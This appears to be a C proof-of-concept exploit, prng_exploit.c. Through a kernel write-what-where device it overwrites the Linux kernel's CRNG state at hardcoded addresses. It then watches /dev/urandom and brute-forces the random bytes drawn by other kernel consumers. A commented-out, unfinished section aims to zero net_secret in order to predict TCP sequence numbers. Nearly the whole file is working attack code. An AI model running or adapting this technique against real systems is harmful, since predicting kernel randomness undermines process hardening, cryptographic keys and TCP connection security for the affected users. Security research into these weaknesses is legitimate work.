/* prng_exploit.c
 * by: Sorin Vatasoiu
 * this uses some known kernel write vulnerability to control the 
 * kernel's pseudo random number generator's state.
 * by reading from /dev/urandom every so often (which also feeds 
 * the kernel's get_random_bytes()), we can detect when something 
 * gets pulled from the crng.
 * since we can write to the state in memory, we can keep track 
 * of where the crng is, and guess what was pulled when we find a 
 * discrepency.
 */

#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>

#include "chacha_prng.h"
#include "common.h"
#include "extraction_analysis.h"

#define ZAP_DEVICE 		"/dev/crng_www" // "/dev/crng_zapper"
#define URAND_DEVICE 	"/dev/urandom"
#define ZAP_INTERVAL 	300 // in seconds
#define READ_DELAY 		1   // in seconds
#define READ_SIZE 		32
#define BUF_SIZE		READ_SIZE

#define MAX_READ_SIZE		256
#define MAX_EXTRACTIONS		3
#define NET_SECRET_SIZE		16

void print_buffer_by_byte(char *buf, int n);
int write_what_where(void *ptr, void *bytes, size_t len);
int reset_crng();
int crng_runner();

// Globals
int num_crng_extractions = 0;
int zap_fd, urand_fd;
char urand_buf[BUF_SIZE];
char crng_buf[BUF_SIZE];
struct extractions intermediate_extractions;
void *kernel_crng_addr = (void *) 0xffffffff81784b00; // 4.9.6: 0xffffffff8177f900;
void *kernel_net_secret_addr = (void *) 0xffffffffa0194400;
struct timeval previous_read_time;
struct timeval current_read_time;

// int possible_extraction_sizes[] = { 1, 2 }; 

// 16 is what is used in create_elf_tables() to initialize AT_RANDOM for a new process
struct extraction_type possible_extraction_sizes[] = { 
	{16, 1}, 
	{READ_SIZE, 1}, 
	{64, 1},
	{64, 0}
}; 

static u32 net_secret[NET_SECRET_SIZE];
struct crng_state old_crng;
struct crng_state primary_crng;

// brute force starting w/ starting_crng, trying to find end_buf
// returns 1 if found, 0 otherwise
// if found, return intermediate extractions in _out_extractions
int brute_force_intermediate_extractions(
	struct crng_state *starting_crng, char end_buf[READ_SIZE], 
	struct extraction_type *possible_extraction_sizes, int num_sizes, 
	int num_extractions, struct extractions *_out_extractions)
{
	if (num_extractions > MAX_EXTRACTIONS) {
		return 0;
	}

	if (num_extractions == 1) {
		_out_extractions->extractions = malloc(MAX_EXTRACTIONS * sizeof(struct extraction));
		if (!_out_extractions->extractions) {
			// ran out of memory
			return 0;
		}
	}

	int i, j;
	char *buf_cpy = malloc(MAX_READ_SIZE);
	_out_extractions->extractions[num_extractions - 1].data = buf_cpy;
	char tmp_buf[MAX_READ_SIZE];
	struct crng_state tmp_crng;
	
	for (i = 0; i < num_sizes; ++i) {
		memcpy(&tmp_crng, starting_crng, sizeof(struct crng_state));
		extract_crng_user(&tmp_crng, tmp_buf, possible_extraction_sizes[i]);

		// copy so that we can look at it after
		memcpy(buf_cpy, tmp_buf, possible_extraction_sizes[i].size);

		// set _out_extractions
		_out_extractions->extractions[num_extractions - 1].et = possible_extraction_sizes[i];

		// print out current extraction path
		printf("Checking: ");
		for (j = 0; j < num_extractions; ++j) {
			printf("-> %d ", _out_extractions->extractions[j].et.size);
		}
		printf("\n");

		if ((possible_extraction_sizes[i].size == READ_SIZE) && 
			!memcmp(tmp_buf, end_buf, READ_SIZE)) {
			// found it
			_out_extractions->num_extractions = num_extractions;
			return 1;
		}

		if (brute_force_intermediate_extractions(&tmp_crng, end_buf, possible_extraction_sizes, 
			num_sizes, num_extractions + 1, _out_extractions) == 1) {
			return 1;
		}
	}
	free(buf_cpy);

	if (num_extractions == 1) {
		free(_out_extractions->extractions);
	}
	return 0;
}

int main(int argc, char **argv) {
	int err = 0;

	// make sure kernel module for zapping the crng is loaded
	zap_fd = open(ZAP_DEVICE, O_WRONLY);
	if (zap_fd < 0) {
		fprintf(stderr, "Couldn't open %s [err: %s]\n", ZAP_DEVICE, strerror(errno));
		return 1;
	}

	// open /dev/urandom
	urand_fd = open(URAND_DEVICE, O_RDONLY);	
	if (urand_fd < 0) {
		fprintf(stderr, "Couldn't open %s [err: %s]\n", URAND_DEVICE, strerror(errno));
		close(zap_fd);
		return 1;
	}

	// initialize our own crng
	if ((err = reset_crng()) < 0) {
		goto _exit;
	}
	
	// // demonstrate that wiping net_secret and then predicting tcp sequence number
	// if ((err = net_runner()) < 0)
	// 	goto _exit;

	// start monitoring primary_crng
	err = crng_runner();

_exit:
	close(urand_fd);
	close(zap_fd);

	return err;
}

void print_buffer_by_byte(char *buf, int n) {
	int i;
	for (i = 0; i < n; ++i) {
		printf("%02x ", (unsigned char) buf[i]);
	}
}

void print_extractions(struct extractions ex) {
	int i;

	printf("FOUND INTERMEDIATE EXTRACTIONS!!!\n");
	printf("==================\n");
	for (i = 0; i < ex.num_extractions; ++i) {
		printf("Extraction #%d: %d bytes", i+1, ex.extractions[i].et.size);
		if (ex.extractions[i].et.backtrack)
			printf(" [backtrack]");
		printf(" | ");
		print_buffer_by_byte(ex.extractions[i].data, ex.extractions[i].et.size);
		printf("\n");
	}
	printf("==================\n");
}

/* crng stuff (get_random_bytes, /dev/urandom) */
int reset_crng() {
	// initialize our own crng
	initialize_crng(&primary_crng); // set to zeros

	// write address of (kernel-space) primary_crng
	return write_what_where(kernel_crng_addr, &primary_crng.state, sizeof(primary_crng.state));
}

int crng_runner() {
	int i, nbytes, found, err = 0;
	struct extraction_type normal_extract = {READ_SIZE,1}; // 1 for backtracking
	while (1) {
		memcpy(&old_crng, &primary_crng, sizeof(struct crng_state));

		++num_crng_extractions;

		// save read time
		previous_read_time = current_read_time;

		// read from /dev/urandom
		nbytes = read(urand_fd, urand_buf, normal_extract.size);
		if (nbytes < READ_SIZE) {
			fprintf(stderr, "Couldn't read from %s [err: %s]\n", URAND_DEVICE, strerror(errno));
			break;
		}
		
		if (gettimeofday(&current_read_time, NULL) < 0) {
			// couldn't get time of day, ... ok
		}

		// check 
		extract_crng_user(&primary_crng, crng_buf, normal_extract);

		if (memcmp(crng_buf, urand_buf, READ_SIZE)) {
			// discrepency spotted
			printf("[%d]: Found a discrepency on extraction\n", num_crng_extractions);
			if (brute_force_intermediate_extractions(&old_crng, urand_buf, 
				possible_extraction_sizes, sizeof(possible_extraction_sizes)/sizeof(struct extraction_type), 
				1, &intermediate_extractions) == 1) {
				print_extractions(intermediate_extractions);
				analyze_extractions(intermediate_extractions, timeval_to_ms(&previous_read_time), timeval_to_ms(&current_read_time));
				break;
			} else {
				printf("Failed to find intermediate extractions :(. Rezapping...\n");

				if ((err = reset_crng()) < 0)
					break;
			}
		} else {
			printf("[%d]: Kernel and user crng matched!\n", num_crng_extractions);
		}

		// sleep
		sleep(READ_DELAY);
	}
	return err;
}

/* net_secret stuff (net_secret) */
/*
int reset_net_secret() {
	// initialize our own crng
	memset(&net_secret, 0, sizeof(net_secret)); // set to zeros

	// write address of (kernel-space) net_secret
	return write_what_where(kernel_net_secret_addr, net_secret, sizeof(net_secret));
}

int net_runner() {
	__u32 actual_tcp_seq, expected_tcp_seq;
	int nbytes, found, err = 0;
	if ((err = reset_net_secret()) < 0)
		return err;

	expected_tcp_seq = secure_tcp_sequence_number_user(__be32 saddr, __be32 daddr,
				 __be16 sport, __be16 dport)

	tcp_packet = capture_tcp_packet();
	actual_tcp_seq = extract_tcp_seq_from_packet(tcp_packet);

	if (tcp_packet != actual_tcp_seq)
		return -1;
	return 0;
}
*/

/* write_what_where primitive */
int write_what_where(void *ptr, void *bytes, size_t len) {
	int nbytes, buf_len;
	const int ptr_len = 20; // 20 for ~size of ptr as a string
	char *buf = malloc(len + ptr_len);

	// write (kernel-space) address to buffer
	if ((buf_len = snprintf(buf, ptr_len, "%llx ", (unsigned long long) ptr)) < 0) {
		fprintf(stderr, "Failed to format buffer to write to zapper [err: %d]\n", buf_len);
		free(buf);
		return buf_len;
	}

	// write bytes that we want to set the state to
	memcpy(buf + buf_len, bytes, len);
	buf_len += len;

	// write to zapper
	nbytes = write(zap_fd, buf, buf_len);
	if (nbytes < 0) {
		fprintf(stderr, "Couldn't zap kernel addr %p with %d bytes [err: %s]\n", ptr, buf_len, strerror(errno));
		free(buf);
		return nbytes;
	}

	free(buf);
	return 0;
}